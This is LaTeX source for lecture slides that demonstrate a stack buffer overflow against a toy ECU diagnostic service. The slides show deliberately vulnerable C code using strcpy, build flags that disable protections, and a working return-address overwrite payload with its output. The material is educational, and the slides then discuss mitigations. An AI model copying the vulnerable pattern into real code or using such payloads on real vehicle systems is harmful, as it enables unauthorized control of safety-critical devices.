% Live vulnerability exploitation
\xchapter{Live Demo}

\begin{frame}[plain]
  \vfill\centering
  {\color{tumblue}\Huge\bfseries Live Demo\par}
  \vspace{3mm}
  {\large\color{tumgrey} Turning a memory bug into control of an ECU}
  \vfill
\end{frame}

\begin{frame}{How a Hacker Reaches the Brakes}
  \centering
  \begin{tikzpicture}[font=\footnotesize, node distance=5mm,
     box/.style={draw,rounded corners,minimum height=1.05cm,minimum width=1.9cm,align=center},
     arr/.style={-Stealth,very thick,tumblue}]
    \node[cloud,draw,fill=gray!12,aspect=2,align=center,minimum width=1.9cm,minimum height=1.1cm] (net) {attacker\\(internet)};
    \node[box,fill=alertred!18,draw=alertred,very thick,right=of net] (info) {Infotainment\\ECU};
    \node[box,fill=tumblue!12,right=of info] (gw) {Gateway};
    \node[box,fill=tumblue!12,right=of gw] (can) {CAN bus\\+ ECUs};
    \node[box,fill=alertred!30,right=of can] (act) {Brakes /\\Steering};
    \draw[arr] (net)--(info); \draw[arr] (info)--(gw); \draw[arr] (gw)--(can); \draw[arr] (can)--(act);
    \node[alertred,align=center,font=\scriptsize] (lbl) at ($(info)+(0,-1.4)$) {today's live demo\\lives here};
    \draw[-Stealth,alertred,thick] (lbl)--(info);
  \end{tikzpicture}
  \vspace{4mm}
  \begin{itemize}
    \item A remote bug gets you into \emph{one} internet-facing ECU. The real prize is \textbf{past the gateway}, onto the CAN bus, where the brakes and steering listen.
    \item The Jeep did the whole chain. In a minute we'll do the first box: \textbf{turn a memory bug into control of an ECU.}
  \end{itemize}
\end{frame}

\begin{frame}{Live Demo: Setup}
  \begin{itemize}
    \item \textbf{Target}: a toy ECU diagnostic service. \texttt{handle\_diagnostic\_request()} copies an incoming payload into an 8-byte stack buffer; \texttt{unlock\_ecu()} is a privileged routine the program never calls.
    \item \textbf{Bug class}: 7PK Input Validation together with API Abuse (a dangerous \texttt{strcpy}), CWE-120.
    \item \textbf{Environment}: an isolated lab VM, compiled without modern protections (\texttt{-fno-stack-protector -no-pie}) so the classic textbook behaviour is visible. \alert{Never ship real code built this way.}
    \item \textbf{Goal}: overflow the buffer so the handler "returns" into \texttt{unlock\_ecu()}, a routine that should sit behind seed-key authentication.
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Step 1: The Vulnerable Code}
  \begin{lstlisting}[language=C]
void unlock_ecu(void) {                       // never called by the program
    write(1, "SECURITY ACCESS GRANTED\n", 24); // privileged routine
}
void handle_diagnostic_request(char *payload) {
    char buf[8];
    strcpy(buf, payload);            // no length check -- CWE-120
}
  \end{lstlisting}
  \begin{itemize}
    \item \texttt{buf} is 8 bytes. \texttt{payload} comes straight from the diagnostic request, fully attacker-controlled.
    \item \texttt{strcpy} copies until it hits a \texttt{NUL} byte, however far past the end of \texttt{buf} that is. A SAST tool would flag this instantly.
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Step 2: Crash It}
\begin{lstlisting}[language=bash]
$ ./vuln hello
diagnostic request handled normally - no hijack.

$ ./vuln $(python3 -c 'print("A"*50)')
Segmentation fault
\end{lstlisting}
  \begin{itemize}
    \item 50 bytes into an 8-byte buffer overwrites the saved base pointer and the saved return address with \texttt{0x4141...} (\texttt{'A'}s).
    \item The CPU then tries to "return" to address \texttt{0x4141414141414141} and crashes. We now control that address.
  \end{itemize}
\end{frame}

\begin{frame}{Step 3: The Plan, in One Picture}
  \centering
  \begin{tikzpicture}[every node/.style={font=\footnotesize}]
    % stack layout
    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=tumblue!15] (buf) at (0,0) {\texttt{buf[8]}};
    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=gray!20, right=0cm of buf] (rbp) {saved RBP};
    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=orange!30, right=0cm of rbp] (ret) {return addr};
    % braces / labels
    \node[font=\scriptsize] at (buf.south) [below=1mm] {8 bytes};
    \node[font=\scriptsize] at (rbp.south) [below=1mm] {8 bytes};
    \node[font=\scriptsize] at (ret.south) [below=1mm] {8 bytes};
    % payload annotation
    \node[alertred, align=center, font=\footnotesize] at (0,1.8) {16 bytes of \texttt{'A'}};
    \draw[-Stealth, alertred, thick] (-1.1,1.5) -- (-1.1,0.55);
    \draw[-Stealth, alertred, thick] (1.3,1.5) -- (1.3,0.55);
    \node[tumblue, align=center, font=\footnotesize] at (5.2,1.8) {address of\\\texttt{unlock\_ecu()}};
    \draw[-Stealth, tumblue, thick] (5.2,1.3) -- (5.2,0.55);
  \end{tikzpicture}

  \vspace{4mm}
  \begin{itemize}
    \item Fill the 8-byte buffer and the 8-byte saved RBP with 16 \texttt{'A'}s, then put the address of \texttt{unlock\_ecu()} where the return address was.
    \item When \texttt{handle\_diagnostic\_request()} returns, it jumps into \texttt{unlock\_ecu()}.
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Step 4: Build the Payload and Fire}
\begin{lstlisting}[language=bash]
$ ./vuln
unlock_ecu() is at address: 0x401196   # the program tells us

$ ./vuln $(python3 -c 'import sys;
    sys.stdout.buffer.write(b"A"*16 + b"\x96\x11\x40")')
\end{lstlisting}
  \begin{itemize}
    \item 16 filler bytes, then \texttt{unlock\_ecu()}'s address in little-endian (low byte first: \texttt{96 11 40}).
    \item We only write the three non-zero bytes. \texttt{strcpy}'s own \texttt{NUL} terminator supplies the zero high bytes of the address, so the payload has no \texttt{NUL} and passes cleanly as an argument.
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Step 5: Watch It Run}
\begin{lstlisting}[language=bash]
$ ./exploit.sh
unlock_ecu() = 0x401196 , offset = 16 bytes

  >> [ECU] SECURITY ACCESS GRANTED  (no key was checked)
  >> Immobilizer: OFF  Doors: UNLOCKED  Engine start: ENABLED

Segmentation fault
\end{lstlisting}
  \begin{itemize}
    \item That banner is the proof: \texttt{unlock\_ecu()} ran, the car ``granted access'' with no key, because we overwrote the return address, not because any code called it.
    \item The crash right after is expected: we jumped into \texttt{unlock\_ecu()} but never set up a clean way for it to return. The banner printed \emph{first} -- that's what matters.
  \end{itemize}
\end{frame}

\begin{frame}{Step 6: What Just Happened, in One Sentence}
  \begin{alertblock}{}
    An attacker who controls input copied into a fixed stack buffer controls where the program's execution goes next, including into code paths that were never meant to be reachable.
  \end{alertblock}
  \begin{itemize}
    \item On a real ECU, \texttt{unlock\_ecu()} stands in for a privileged routine, a calibration function or a debug backdoor, that should sit behind an authentication check this bug walks straight past.
    \item This is exactly why Input Validation sits at the top of the 7PK taxonomy, and why memory-safe languages like Rust and hardware mitigations (stack canaries, ASLR, NX/DEP, Pointer Authentication) exist. More on that next.
  \end{itemize}
\end{frame}

\begin{frame}{Going Further (Conceptually)}
  \footnotesize
  \setlength{\itemsep}{0pt}
  \begin{itemize}
    \item Today we jumped to a function already in the binary. A real attacker's next move is to jump into code \emph{they} supply, placed inside the same oversized input.
    \item This is exactly what the next slide's mitigations stop: NX/DEP makes the stack non-executable, ASLR hides where the buffer sits, and a stack canary catches the overwrite before the hijacked return happens. We're deliberately stopping at the concept, not a working payload.
    \item A worked example that goes all the way to a shell, via a GOT overwrite: \href{https://m-kamal.me/journal/got-challenge-journal/}{m-kamal.me/journal/got-challenge-journal}.
  \end{itemize}
\end{frame}
